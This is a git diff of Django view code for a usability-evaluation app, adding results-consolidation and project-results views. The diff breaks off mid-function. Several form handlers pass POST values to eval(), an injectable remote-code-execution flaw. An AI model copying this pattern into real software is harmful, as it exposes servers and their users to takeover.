@@ -7,6 +7,7 @@ from django.conf.urls.static import static
 from app.forms import *
 from app.models import *
 from app.filters import *
+import plotly.offline as opy
 
 from app.funcs import *
 import subprocess
@@ -41,6 +42,7 @@ from django.db.models import Q
 - Usability evaluation done? in Smells not working properly.
 """
 
+
 def nav_TeamLeader_projects(request):
     projects_ = []
     try:
@@ -48,8 +50,11 @@ def nav_TeamLeader_projects(request):
         projects = Project.objects.filter(teamLeader=teamLeader)
         for project in projects:
             projects_.append(project)
+            
     except TeamLeader.DoesNotExist:
         print("TeamLeader.DoesNotExist")
+    projects_.sort(key=lambda x: x.name)
+
     return projects_
 
 def nav_TeamMember_projects(request):
@@ -76,6 +81,8 @@ def nav_TeamMember_projects(request):
                 projectsBool = True
     except TeamMember.DoesNotExist:
         print("TeamMember.DoesNotExist")
+    projects_.sort(key=lambda x: x.name)
+
     return projectsBool, projects_
 
 
@@ -98,14 +105,37 @@ def manage_teamMember_Invitations(request):
         invitationsBool = False
         try:
             teamMember = TeamMember.objects.filter(user=request.user).first()
+
+        except TeamMember.DoesNotExist:
+            print("TeamLeader.DoesNotExist")
+
+        if request.method == 'GET':
+            print("IF -------------------------")
+            form = InvitationTMSearchForm(request.POST)
+            print(form)
+            if form.is_valid():
+                invitations = Invitations.objects.filter(teamMember=teamMember).filter(
+                                                 Q(project__name__icontains= request.GET.get('proj_name')) if request.GET.get('proj_name') else Q() 
+                                                & Q(project__teamLeader__user__first_name__icontains=request.GET.get('leader_name')) if request.GET.get('leader_name') else Q() 
+                                                & Q(project__teamLeader__user__email__icontains= request.GET.get('teamLeaderEmail')) if request.GET.get('teamLeaderEmail') else Q() 
+                                                & Q(project__start_date__gte= request.GET.get('start_date')) if request.GET.get('start_date') else Q() 
+                                                & Q(project__end_date__lte=request.GET.get('end_date')) if request.GET.get('end_date') else Q())
+                for invitation in invitations:
+                    invitations_.append(invitation)
+        else:
+            print("ELSE -------------------------")
+
             invitations = Invitations.objects.filter(teamMember=teamMember)
             for invitation in invitations:
                 invitations_.append(invitation)
                 invitationsBool = True
-        except TeamMember.DoesNotExist:
-            print("TeamLeader.DoesNotExist")
+            
+
+        if len(invitations_)!=0:
+            invitationsBool = True
+
         return render(request, 'manage_teamMember_Invitations.html', {'projectBool':projectBool,'projects_':projects,
-                                                                      'invitations': invitations_, 
+                                                                      'invitations': set(invitations_), 
                                                                       'invitationsBool':invitationsBool, 
                                                                       'notificationsBool':invitations_notifications(request)}) 
     return redirect('login')
@@ -118,7 +148,512 @@ def accept_teamMember_Invitation(request, id):
         return HttpResponseRedirect('/manage_teamMember_Invitations/')
     return redirect('login')
 
+#-------------------------------------------------------------------------------------------
+def Smells_usability_tests_resultsConsolidation(request, id):
+    if request.user.is_authenticated:
+        projectBool, Allprojects= nav_TeamMember_projects(request)
+        project = Project.objects.filter(id=id).first()
 
+        videos_dict = {}
+        videos_dict_bool = False
+        videos = Video.objects.filter(project__id=id) 
+        """
+        for video in videos:
+            #apenas aparece o video splited
+            if SubVideoTask.objects.filter(video = video).exists():
+
+               #numero de subvideos (tasks) referentes ao user
+               subVideoTask = SubVideoTask.objects.filter(video = video)  
+                #check if exists in UsabilityEval_CW_Smells_Emotion and UsabilityEval_CW_Smells_without_Emotion
+               for sV in subVideoTask:
+                    if not UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask = sV, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com")).exists():
+                        usabilityEval_CW_Smells_Emotion = UsabilityEval_CW_Smells_Emotion.objects.create(subVideoTask = sV, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com"))
+                        usabilityEval_CW_Smells_Emotion.save()
+                        print("NOT ------")
+
+                    if not UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask = sV, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com")).exists():
+                        usabilityEval_CW_Smells_without_Emotion = UsabilityEval_CW_Smells_without_Emotion.objects.create(subVideoTask = sV, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com"))
+                        usabilityEval_CW_Smells_without_Emotion.save()
+                        print("NOT ------")
+        """
+        for video in videos:
+            #apenas aparece o video splited
+            if SubVideoTask.objects.filter(video = video).exists():
+                subVideoTask = SubVideoTask.objects.filter(video = video)  
+                #check if exists in UsabilityEval_CW_Smells_Emotion and UsabilityEval_CW_Smells_without_Emotion
+                for sV in subVideoTask:
+                    if not ResultsConsulidation.objects.filter(subVideoTask = sV).exists():
+                        resultsConsulidation = ResultsConsulidation.objects.create(subVideoTask = sV)
+                        resultsConsulidation.save()
+
+        videos_dict = {}
+        for video in videos:
+            resultsConsulidatioPermission = ResultsConsulidationPermission.objects.filter(video=video).exists()
+            if resultsConsulidatioPermission:
+                videos_dict[video] = True
+            else:
+                videos_dict[video] = False
+
+        if len(videos_dict) != 0:
+            videos_dict_bool = True
+        return render(request, 'Smells_usability_tests_resultsConsolidation.html', {'project_name':project.name,
+                                                           'videos_dict': videos_dict,
+                                                            'projectBool':projectBool,
+                                                            'projects_':Allprojects,'videos_dict_bool':videos_dict_bool}) 
+    return redirect('login')
+
+def Smells_tasks_resultsConsolidation(request, x, projName, projID, id):
+    #x: with/without emotions
+    #id: video ID
+    if request.user.is_authenticated:
+        projectBool, Allprojects= nav_TeamMember_projects(request)
+        teamMember = TeamMember.objects.get(user=request.user)
+
+        subVideo_by_userUID = SubVideoTask.objects.filter(video_id=id)
+        #print("subVideo_by_userUID   ", subVideo_by_userUID)
+        video_dict={}
+        for sV in subVideo_by_userUID:
+          
+            data= []
+            data.append(sV.task_number) #0
+            data.append(sV.video.usability_test_name)  #1
+            actions_ = []
+            actions = sV.actions.split("#")
+            for action in actions:
+                actions_.append(action)
+            data.append(actions_) #2
+            if x =="with_emotions":
+                data.append(sV.screen_sub_video_emotions) #3
+
+                #usabilityEval_CW_Smells_Emotion = UsabilityEval_CW_Smells_Emotion.objects.get(subVideoTask = sV, teamMember=teamMember)
+                
+                #data.append(usabilityEval_CW_Smells_Emotion.usabilitySmells_done_with_emotion) #4
+                resultsConsulidation = ResultsConsulidation.objects.get(subVideoTask = sV)
+
+                data.append(resultsConsulidation.usabilitySmells_done_with_emotion) #4
+
+            elif x =="without_emotions":
+                data.append(sV.screen_sub_video_sem_emotions) #3
+
+         
+                #usabilityEval_CW_Smells_without_Emotion = UsabilityEval_CW_Smells_without_Emotion.objects.get(subVideoTask = sV, teamMember=teamMember)
+                
+                #print("DD ", usabilityEval_CW_Smells_without_Emotion)
+                resultsConsulidation = ResultsConsulidation.objects.get(subVideoTask = sV)
+
+                data.append(resultsConsulidation.usabilitySmells_done_without_emotion) #4
+                #data.append(usabilityEval_CW_Smells_without_Emotion.usabilitySmells_done_without_emotion) #4
+
+
+            data.append(sV.id) #5
+            data.append(x) #6 emotions_check
+            data.append(sV.video.user_type)  #7
+            data.append(sV.video.user_UID)  #8
+            data.append(sV.video.local)  #9
+            print("----------- ",data)
+            video_dict[emotion_dict_to_plot(sV.emotions_plot_info)]=data
+        return render(request,  'Smells_tasks_resultsConsolidation.html', { 'project_name':projName,
+                                                    'projectID':projID, 
+                                                  'emotion_type':x, 'id': id,
+                                                    'video_dict':video_dict,
+                                                    'projects': nav_TeamLeader_projects(request),
+                                                    'projectBool':projectBool,
+                                                    'projects_':Allprojects})
+    else:
+        return redirect('login')
+
+
+def Smells_evaluateTask_resultsConsolidation(request, x, projName, projID, id):
+    print("TASK ID ", id)
+    emotions_check = x
+    task_id = id
+    subVideoTask = SubVideoTask.objects.get(id=task_id)
+    print("::: ",subVideoTask.id)
+
+
+    resultsConsulidation = ResultsConsulidation.objects.get(subVideoTask = subVideoTask)
+
+    #usabilityEval_CW_Smells_Emotion = UsabilityEval_CW_Smells_Emotion.objects.get(subVideoTask = subVideoTask,  teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com"))
+    #usabilityEval_CW_Smells_without_Emotion = UsabilityEval_CW_Smells_without_Emotion.objects.get(subVideoTask = subVideoTask, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com"))
+
+    projectBool, Allprojects= nav_TeamMember_projects(request)
+
+            
+    new_data = []
+    if emotions_check =="with_emotions":
+        data = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask = subVideoTask)  
+        new_data = []
+        for d in data:
+            new_data.append(d.teamMember)
+            new_data.append(json.loads(d.usabilitySmells_selected_with_emotion))
+            new_data.append(d.usabilitySmells_notes_with_emotion)
+    if emotions_check =="without_emotions":
+        data = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask = subVideoTask)  
+        new_data = []
+        for d in data:
+            new_data.append(d.teamMember)
+            new_data.append(json.loads(d.usabilitySmells_selected_without_emotion))
+            new_data.append(d.usabilitySmells_notes_without_emotion)
+
+
+
+    try:
+        teamLeader = Project.objects.filter(id=projID).first().teamLeader
+    except TeamLeader.DoesNotExist:
+        print("TeamLeader.DoesNotExist")
+
+
+    usabilitySmells = UsabilitySmells.objects.filter(teamLeader=teamLeader)
+
+    usabilitySmells_ = []
+    index = 0
+    for usabilitySmell in usabilitySmells:
+        usabilitySmells_.append((index, usabilitySmell.usabilitySmell, usabilitySmell.description))
+        index +=1
+
+    videoID =SubVideoTask.objects.get(id=task_id).video.id
+
+    if request.user.is_authenticated:
+        
+        if request.method == 'POST':
+
+            if emotions_check =="with_emotions":
+                form = TaskWithEmotionForm(request.POST)
+                if form.is_valid():
+                    data = form.cleaned_data
+                    if 'usabilitySmells' in request.POST:
+                        usabilitySmells = request.POST.getlist('usabilitySmells', [])
+                        #options selected inside list
+                        choices_selected = []
+                        for uS in usabilitySmells:
+                            choices_selected.append(eval(uS)[1])
+                        resultsConsulidation.usabilitySmells_selected_with_emotion = json.dumps(choices_selected)
+
+                    if data['usabilitySmells_notes_with_emotion'] != "":   
+                        resultsConsulidation.usabilitySmells_notes_with_emotion = data['usabilitySmells_notes_with_emotion']
+                    
+                    if data['number_usability_problems_Smells_with_emotion'] != "":   
+                        resultsConsulidation.number_usability_problems_Smells_with_emotion = data['number_usability_problems_Smells_with_emotion']
+
+                    if request.POST.get('usabilitySmells_done_with_emotion', False):
+                        print("XXX TRUE")
+
+                        resultsConsulidation.usabilitySmells_done_with_emotion = True
+                    else:
+                        print("XXX FALSE")
+                        resultsConsulidation.usabilitySmells_done_with_emotion = False
+                    resultsConsulidation.save()
+                    print("&&& & ", resultsConsulidation.usabilitySmells_done_with_emotion)
+
+                    return HttpResponseRedirect('/Smells_tasks_resultsConsolidation/with_emotions/'+ str(projName) + "/"+ str(projID) + "/"+ str(videoID))
+
+            elif emotions_check =="without_emotions":
+                form = TaskWithoutEmotionForm(request.POST)
+                if form.is_valid():
+                    data = form.cleaned_data
+                    print(" --- ", data)
+                    if 'usabilitySmells' in request.POST:
+                        usabilitySmells = request.POST.getlist('usabilitySmells', [])
+                        #options selected inside list
+                        choices_selected = []
+                        for uS in usabilitySmells:
+                            choices_selected.append(eval(uS)[1])
+                        resultsConsulidation.usabilitySmells_selected_without_emotion = json.dumps(choices_selected)
+
+
+                    if request.POST.get('usabilitySmells_done_without_emotion', False):
+                        print("TRUE")
+                        resultsConsulidation.usabilitySmells_done_without_emotion = True
+                    else:
+                        resultsConsulidation.usabilitySmells_done_without_emotion = False
+
+                    if data['number_usability_problems_Smells_without_emotion'] != "":   
+                        resultsConsulidation.number_usability_problems_Smells_without_emotion = data['number_usability_problems_Smells_without_emotion']
+
+                    if data['usabilitySmells_notes_without_emotion'] != "":   
+                        resultsConsulidation.usabilitySmells_notes_without_emotion = data['usabilitySmells_notes_without_emotion']
+   
+                    resultsConsulidation.save()
+                    return HttpResponseRedirect('/Smells_tasks_resultsConsolidation/without_emotions/'+ str(projName) + "/"+ str(projID) + "/"+ str(videoID))
+        else:
+            if emotions_check =="with_emotions":
+                form = TaskWithEmotionForm(initial={
+          
+                    'usabilitySmells_notes_with_emotion': resultsConsulidation.usabilitySmells_notes_with_emotion,
+                    'usabilitySmells_done_with_emotion': resultsConsulidation.usabilitySmells_done_with_emotion,
+                    'number_usability_problems_Smells_with_emotion': resultsConsulidation.number_usability_problems_Smells_with_emotion,
+
+                })
+            elif emotions_check =="without_emotions":
+                form = TaskWithoutEmotionForm(initial={
+        
+                    'usabilitySmells_notes_without_emotion': resultsConsulidation.usabilitySmells_notes_without_emotion,
+                    'usabilitySmells_done_without_emotion': resultsConsulidation.usabilitySmells_done_without_emotion,
+                    'number_usability_problems_Smells_without_emotion': resultsConsulidation.number_usability_problems_Smells_without_emotion,
+
+                })
+
+        return render(request, 'Smells_evaluateTask_resultsConsolidation.html', {'videoID':videoID,'emotions_check':emotions_check, 'task_id':task_id, 
+                                                            'screen_sub_video_sem_emotions':subVideoTask.screen_sub_video_sem_emotions,
+                                                            'screen_sub_video_emotions':subVideoTask.screen_sub_video_emotions,
+                                                             'task_number':subVideoTask.task_number,'usabilitySmells':usabilitySmells_,
+                                                             'emotions_plot_info':emotion_dict_to_plot(subVideoTask.emotions_plot_info), 
+                                                             'form': form, 'uS_with_emotions': json.loads(resultsConsulidation.usabilitySmells_selected_with_emotion),
+                                                             'uS_without_emotions': json.loads(resultsConsulidation.usabilitySmells_selected_without_emotion)  ,
+                                                             'projects': nav_TeamLeader_projects(request),
+                                                             'projectBool':projectBool,
+                                                             'projects_':Allprojects,
+                                                             'project_name':projName,
+                                                             'data':new_data,
+                                                             'projectID':projID})
+    return redirect('login')
+
+#-------------------------------------------------------------------------------------------
+def CW_usability_tests_resultsConsolidation(request, id):
+    #id = project ID
+    print("PROJECT ID  ", id)
+    if request.user.is_authenticated:
+        projectBool, Allprojects= nav_TeamMember_projects(request)
+
+        print("PROJECTS  ",Allprojects)
+
+        videos_dict_bool = False
+      
+        videos = Video.objects.filter(project__id=id) 
+        project = Project.objects.filter(id=id).first()
+        print(project)
+        print(videos)
+        projetos = Allprojects
+        videos = Video.objects.filter(project__id=id) 
+        project = Project.objects.filter(id=id).first()
+        print(project)
+        print(videos)
+
+        """
+        for video in videos:
+            #apenas aparece o video splited
+            if SubVideoTask.objects.filter(video = video).exists():
+               teamMember = TeamMember.objects.get(user=request.user)
+
+               #numero de subvideos (tasks) referentes ao user
+               subVideoTask = SubVideoTask.objects.filter(video = video)  
+                #check if exists in UsabilityEval_CW_Smells_Emotion and UsabilityEval_CW_Smells_without_Emotion
+               for sV in subVideoTask:
+                    if not UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask = sV, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com")).exists():
+                        usabilityEval_CW_Smells_Emotion = UsabilityEval_CW_Smells_Emotion.objects.create(subVideoTask = sV,teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com"))
+                        usabilityEval_CW_Smells_Emotion.save()
+
+                    if not UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask = sV, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com")).exists():
+                        usabilityEval_CW_Smells_without_Emotion = UsabilityEval_CW_Smells_without_Emotion.objects.create(subVideoTask = sV, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com"))
+                        usabilityEval_CW_Smells_without_Emotion.save()
+        """
+        for video in videos:
+            #apenas aparece o video splited
+            if SubVideoTask.objects.filter(video = video).exists():
+                subVideoTask = SubVideoTask.objects.filter(video = video)  
+                #check if exists in UsabilityEval_CW_Smells_Emotion and UsabilityEval_CW_Smells_without_Emotion
+                for sV in subVideoTask:
+                    if not ResultsConsulidation.objects.filter(subVideoTask = sV).exists():
+                        resultsConsulidation = ResultsConsulidation.objects.create(subVideoTask = sV)
+                        resultsConsulidation.save()
+
+
+        videos_dict = {}
+        for video in videos:
+            resultsConsulidatioPermission = ResultsConsulidationPermission.objects.filter(video=video).exists()
+            if resultsConsulidatioPermission:
+                videos_dict[video] = True
+            else:
+                videos_dict[video] = False
+
+       
+        if len(videos) != 0:
+            videos_dict_bool = True
+        return render(request, 'CW_usability_tests_resultsConsolidation.html', {'project_name':project.name,
+                                                           'videos_dict': videos_dict,
+                                                            'projectBool':projectBool,
+                                                            'projects_':Allprojects,
+                                                            'videos_dict_bool':videos_dict_bool}) 
+    return redirect('login')
+
+def CW_tasks_resultsConsolidation(request, x, projName, projID, id):
+    #x: with/without emotions
+    #id: video ID
+    if request.user.is_authenticated:
+        projectBool, Allprojects= nav_TeamMember_projects(request)
+
+        subVideo_by_userUID = SubVideoTask.objects.filter(video_id=id)
+        teamMember = TeamMember.objects.get(user=request.user)
+
+        video_dict={}
+        for sV in subVideo_by_userUID:
+            data= []
+            data.append(sV.task_number) #0
+            data.append(sV.created_at)  #1
+            actions_ = []
+            actions = sV.actions.split("#")
+            for action in actions:
+                actions_.append(action)
+            data.append(actions_) #2
+            if x =="with_emotions":
+                data.append(sV.screen_sub_video_emotions) #3
+                #usabilityEval_CW_Smells_Emotion = UsabilityEval_CW_Smells_Emotion.objects.get(subVideoTask = sV, teamMember=teamMember)
+                resultsConsulidation = ResultsConsulidation.objects.get(subVideoTask = sV)
+
+                data.append(resultsConsulidation.eval_done_with_emotion) #4
+
+            elif x =="without_emotions":
+                data.append(sV.screen_sub_video_sem_emotions) #3
+                usabilityEval_CW_Smells_without_Emotion = UsabilityEval_CW_Smells_without_Emotion.objects.get(subVideoTask = sV,teamMember=teamMember)
+                print("DD ", usabilityEval_CW_Smells_without_Emotion.eval_done_without_emotion)
+
+                resultsConsulidation = ResultsConsulidation.objects.get(subVideoTask = sV)
+
+                data.append(resultsConsulidation.eval_done_without_emotion) #4
+                #data.append(usabilityEval_CW_Smells_without_Emotion.eval_done_without_emotion) #4
+
+            data.append(sV.id) #5
+            data.append(x) #6 emotions_check
+            data.append(sV.video.user_type)  #7
+            data.append(sV.video.user_UID)  #8
+            data.append(sV.video.local)  #9
+
+            print("DATA ---------- ", data)
+            video_dict[emotion_dict_to_plot(sV.emotions_plot_info)]=data
+        return render(request,  'CW_tasks_resultsConsolidation.html', {'project_name':projName,
+                                                    'projectID':projID, 
+                                                  'emotion_type':x, 'id': id,
+                                                    'video_dict':video_dict,
+                                                    'projects': nav_TeamLeader_projects(request),
+                                                    'projectBool':projectBool,
+                                                    'projects_':Allprojects})
+    else:
+        return redirect('login')
+    
+def CW_evaluateTask_resultsConsolidation(request, x, projName, projID, id):
+
+    emotions_check = x
+    task_id = id
+    subVideoTask = SubVideoTask.objects.get(id=task_id)
+    teamMember = TeamMember.objects.get(user=request.user)
+    #usabilityEval_CW_Smells_Emotion = UsabilityEval_CW_Smells_Emotion.objects.get(subVideoTask = subVideoTask, teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com"))
+    #usabilityEval_CW_Smells_without_Emotion = UsabilityEval_CW_Smells_without_Emotion.objects.get(subVideoTask = subVideoTask,teamMember=TeamMember.objects.get(user__email="x2xxx123@gmail.com"))
+
+    resultsConsulidation = ResultsConsulidation.objects.get(subVideoTask = subVideoTask)
+    print("resultsConsulidation ID --->>>> ",resultsConsulidation.id)
+    videoID =SubVideoTask.objects.get(id=task_id).video.id
+    actions_ = []
+    actions = subVideoTask.actions.split("#")
+    for action in actions:
+        actions_.append(action)
+    if request.user.is_authenticated:
+        projectBool, Allprojects= nav_TeamMember_projects(request)
+        data = []
+        if emotions_check =="with_emotions":
+            data = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask = subVideoTask)  
+        if emotions_check =="without_emotions":
+            data = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask = subVideoTask)  
+        print("DTA ---", data)
+    
+        if request.method == 'POST':
+            if emotions_check =="with_emotions":
+                form = TaskWithEmotionForm(request.POST)
+                print("TaskWithEmotionForm")
+                if form.is_valid():
+                    print("333 TaskWithEmotionForm")
+
+                    data = form.cleaned_data
+                    print("22 DATA  ", data)
+                    if data['q1_with_emotion'] != "":
+                        resultsConsulidation.q1_with_emotion = data['q1_with_emotion']
+                    if data['q2_with_emotion'] != "":
+                        resultsConsulidation.q2_with_emotion = data['q2_with_emotion']
+                    if data['q3_with_emotion'] != "":
+                        resultsConsulidation.q3_with_emotion = data['q3_with_emotion']
+                    if data['q4_with_emotion'] != "":
+                        resultsConsulidation.q4_with_emotion = data['q4_with_emotion']
+                    if data['notes_with_emotion'] != "":   
+                        resultsConsulidation.notes_with_emotion = data['notes_with_emotion']
+
+                    if data['number_usability_problems_CW_with_emotion'] != "":   
+                        resultsConsulidation.number_usability_problems_CW_with_emotion = data['number_usability_problems_CW_with_emotion']
+
+                    if request.POST.get('eval_done_with_emotion', False):
+                        resultsConsulidation.eval_done_with_emotion = True
+                    else:
+                        resultsConsulidation.eval_done_with_emotion = False
+                    print("SSS  ", resultsConsulidation.eval_done_with_emotion)
+                    resultsConsulidation.save()
+                    return HttpResponseRedirect('/CW_tasks_resultsConsolidation/with_emotions/'+ str(projName) + "/"+ str(projID) + "/"+ str(videoID))
+
+            elif emotions_check =="without_emotions":
+                form = TaskWithoutEmotionForm(request.POST)
+                print("TaskWithoutEmotionForm")
+                if form.is_valid():
+                    print("11 111 TaskWithoutEmotionForm")
+
+                    data = form.cleaned_data
+                    print("DATA  ", data)
+                    if request.POST.get('eval_done_without_emotion', False):
+                        print("TRUE ---")
+                        resultsConsulidation.eval_done_without_emotion = True
+                    else:
+                        resultsConsulidation.eval_done_without_emotion = False
+
+                    if data['number_usability_problems_CW_without_emotion'] != "":   
+                        resultsConsulidation.number_usability_problems_CW_without_emotion = data['number_usability_problems_CW_without_emotion']
+
+                    if data['q1_without_emotion'] != "":
+                        resultsConsulidation.q1_without_emotion = data['q1_without_emotion']
+                    if data['q2_without_emotion'] != "":
+                        resultsConsulidation.q2_without_emotion = data['q2_without_emotion']
+                    if data['q3_without_emotion'] != "":
+                        resultsConsulidation.q3_without_emotion = data['q3_without_emotion']
+                    if data['q4_without_emotion'] != "":
+                        resultsConsulidation.q4_without_emotion = data['q4_without_emotion']
+                    if data['notes_without_emotion'] != "":   
+                        resultsConsulidation.notes_without_emotion = data['notes_without_emotion']
+                    resultsConsulidation.save()
+                    return HttpResponseRedirect('/CW_tasks_resultsConsolidation/without_emotions/'+ str(projName) + "/"+ str(projID) + "/"+ str(videoID))
+        else:
+            if emotions_check =="with_emotions":
+                form = TaskWithEmotionForm(initial={
+                    'q1_with_emotion': resultsConsulidation.q1_with_emotion,
+                    'q2_with_emotion': resultsConsulidation.q2_with_emotion,
+                    'q3_with_emotion': resultsConsulidation.q3_with_emotion,
+                    'q4_with_emotion': resultsConsulidation.q4_with_emotion,
+                    'notes_with_emotion': resultsConsulidation.notes_with_emotion,
+                    'eval_done_with_emotion': resultsConsulidation.eval_done_with_emotion,
+                    'number_usability_problems_CW_with_emotion': resultsConsulidation.number_usability_problems_CW_with_emotion,
+
+                })
+            elif emotions_check =="without_emotions":
+                form = TaskWithoutEmotionForm(initial={
+                    'q1_without_emotion': resultsConsulidation.q1_without_emotion,
+                    'q2_without_emotion': resultsConsulidation.q2_without_emotion,
+                    'q3_without_emotion': resultsConsulidation.q3_without_emotion,
+                    'q4_without_emotion': resultsConsulidation.q4_without_emotion,
+                    'notes_without_emotion': resultsConsulidation.notes_without_emotion,
+                    'eval_done_without_emotion': resultsConsulidation.eval_done_without_emotion,
+                    'number_usability_problems_CW_without_emotion': resultsConsulidation.number_usability_problems_CW_without_emotion,
+
+                })
+
+        return render(request, 'CW_evaluateTask_resultsConsolidation.html', {'project_name':projName,
+                                                    'projectID':projID,
+                                                    'projects': nav_TeamLeader_projects(request),'videoID':videoID,
+                                                    'emotions_check':emotions_check, 'task_id':task_id, 
+                                                    'screen_sub_video_sem_emotions':subVideoTask.screen_sub_video_sem_emotions,
+                                                    'screen_sub_video_emotions':subVideoTask.screen_sub_video_emotions, 
+                                                    'task_number':subVideoTask.task_number,'actions':actions_,
+                                                    'emotions_plot_info':emotion_dict_to_plot(subVideoTask.emotions_plot_info), 
+                                                    'form': form,
+                                                     'projectBool':projectBool,
+                                                     'data':data,
+                                                    'projects_':Allprojects})
+    return redirect('login')
+
+#-------------------------------------------------------------------------------------------
 #1º
 def CW_usability_tests(request, id):
     #id = project ID
@@ -225,7 +760,9 @@ def CW_tasks(request, x, projName, projID, id):
 
             data.append(sV.id) #5
             data.append(x) #6 emotions_check
-
+            data.append(sV.video.user_type)  #7
+            data.append(sV.video.user_UID)  #8
+            data.append(sV.video.local)  #9
             video_dict[emotion_dict_to_plot(sV.emotions_plot_info)]=data
         return render(request,  'CW_tasks.html', {'project_name':projName,
                                                     'projectID':projID, 
@@ -277,7 +814,6 @@ def CW_evaluateTask(request, x, projName, projID, id):
                         usabilityEval_CW_Smells_Emotion.q4_with_emotion = data['q4_with_emotion']
                     if data['notes_with_emotion'] != "":   
                         usabilityEval_CW_Smells_Emotion.notes_with_emotion = data['notes_with_emotion']
-
                     if request.POST.get('eval_done_with_emotion', False):
                         usabilityEval_CW_Smells_Emotion.eval_done_with_emotion = True
                     else:
@@ -347,6 +883,8 @@ def CW_evaluateTask(request, x, projName, projID, id):
                                                     'projects_':Allprojects})
     return redirect('login')
 
+#-------------------------------------------------------------------------------------------
+
 def Smells_usability_tests(request, id):
     if request.user.is_authenticated:
         projectBool, Allprojects= nav_TeamMember_projects(request)
@@ -409,7 +947,7 @@ def Smells_tasks(request, x, projName, projID, id):
         for sV in subVideo_by_userUID:
             data= []
             data.append(sV.task_number) #0
-            data.append(sV.created_at)  #1
+            data.append(sV.video.usability_test_name)  #1
             actions_ = []
             actions = sV.actions.split("#")
             for action in actions:
@@ -431,6 +969,10 @@ def Smells_tasks(request, x, projName, projID, id):
 
             data.append(sV.id) #5
             data.append(x) #6 emotions_check
+            data.append(sV.video.user_type)  #7
+            data.append(sV.video.user_UID)  #8
+            data.append(sV.video.local)  #9
+
             video_dict[emotion_dict_to_plot(sV.emotions_plot_info)]=data
         return render(request,  'Smells_tasks.html', { 'project_name':projName,
                                                     'projectID':projID, 
@@ -451,25 +993,17 @@ def Smells_evaluateTask(request, x, projName, projID, id):
     usabilityEval_CW_Smells_without_Emotion = UsabilityEval_CW_Smells_without_Emotion.objects.get(subVideoTask = subVideoTask, teamMember=teamMember)
 
     projectBool, Allprojects= nav_TeamMember_projects(request)
+    try:
+        teamLeader = Project.objects.filter(id=projID).first().teamLeader
+    except TeamLeader.DoesNotExist:
+        print("TeamLeader.DoesNotExist")
+    usabilitySmells = UsabilitySmells.objects.filter(teamLeader=teamLeader)
 
-   
-    #Get all usability smells from all SubVideoTask
     usabilitySmells_ = []
     index = 0
-    for subVideoTask in SubVideoTask.objects.all():
-        usabilitySmells = subVideoTask.usabilitySmells.split("#")
-        for uS in list(dict.fromkeys(usabilitySmells)):
-            usabilitySmells_.append((index, uS))
-            index +=1
-    dict_smells = {}
-        
-    for index, uS in usabilitySmells_:
-        dict_smells[uS] = index
-
-    # Convert the dictionary back to a list
-    usabilitySmells_ = [(index, uS) for uS, index in dict_smells.items()]
-
-
+    for usabilitySmell in usabilitySmells:
+        usabilitySmells_.append((index, usabilitySmell.usabilitySmell, usabilitySmell.description))
+        index +=1
 
     videoID =SubVideoTask.objects.get(id=task_id).video.id
 
@@ -557,7 +1091,6 @@ def Smells_evaluateTask(request, x, projName, projID, id):
                                                              'project_name':projName,
                                                              'projectID':projID})
     return redirect('login')
-
 
 
 #END TEAM MEMBER VIEW--------------------------------------------------------------------------------------------------------------
@@ -848,25 +1381,454 @@ def editProject(request, id):
         return render(request, 'editProject.html', { 'form': form,'projects': nav_TeamLeader_projects(request)})
     return redirect('login')
 
+def results(request):
+    if request.user.is_authenticated:
+        try:
+            teamLeader = TeamLeader.objects.filter(user=request.user).first()
+
+        except TeamLeader.DoesNotExist:
+            print("TeamLeader.DoesNotExist")
+
+        projects = Project.objects.filter(teamLeader=teamLeader)
+        project_TM_results = {}
+        data= []
+        project_TM_results_bool  = False   
+        for project in projects:
+            invitations = Invitations.objects.filter(project=project, accept=True)
+            videos = Video.objects.filter(project__id=project.id) 
+
+            data.append(invitations.count()) #0 total tasks with emotion done
+            data.append(videos.count()) #0 total tasks with emotion done
+            project_TM_results[project]=data
+        
+        if len(project_TM_results)!=0:
+            project_TM_results_bool = True
+        return render(request, 'results.html', {'project_TM_results': project_TM_results,
+                                                'project_TM_results_bool':project_TM_results_bool, 
+                                                'projects': nav_TeamLeader_projects(request)}) 
+
+    return redirect('login')
+
+class Results:
+  def __init__(self, name, age):
+    self.name = name
+    self.age = age
+
+def projectResults(request, projectID):
+    if request.user.is_authenticated:
+        project = Project.objects.get(id=projectID)
+        videos = Video.objects.filter(project__id=projectID) 
+        video_results ={}
+        for video in videos:
+            if SubVideoTask.objects.filter(video = video).exists():
+                subVideoTasks = SubVideoTask.objects.filter(video = video)
+                dataX= [] # [ [RC, listSmellsEmotion, listSmellsWitouthEmotion ]  ,,,      ]
+                emotion_frequency_final = {0: 0, 1: 0, 2: 0, 3: 0, 4:0, 5: 0, 6: 0}
+
+                for subVideoTask in subVideoTasks:
+
+                    new_data = []
+                    resultsConsulidation = ResultsConsulidation.objects.get(subVideoTask=subVideoTask)
+                    new_data.append(resultsConsulidation)
+                    times_freq_dict = json.loads(resultsConsulidation.subVideoTask.emotions_plot_info)
+
+                    print("--------------------------------------------")
+                    emotion_frequency = {0: 0, 1: 0, 2: 0, 3: 0, 4:0, 5: 0, 6: 0}
+
+                    for time, emotions_freq in times_freq_dict.items():
+                        highest_value_emotion_index = emotions_freq.index(max(emotions_freq))
+                        value = emotion_frequency[highest_value_emotion_index]
+                        emotion_frequency[highest_value_emotion_index] = value +1
+                    
+                    emotion_frequency_final[0] = round(emotion_frequency[0]*100 / sum(emotion_frequency.values()),2)
+                    emotion_frequency_final[1] = round(emotion_frequency[1]*100 / sum(emotion_frequency.values()),2)
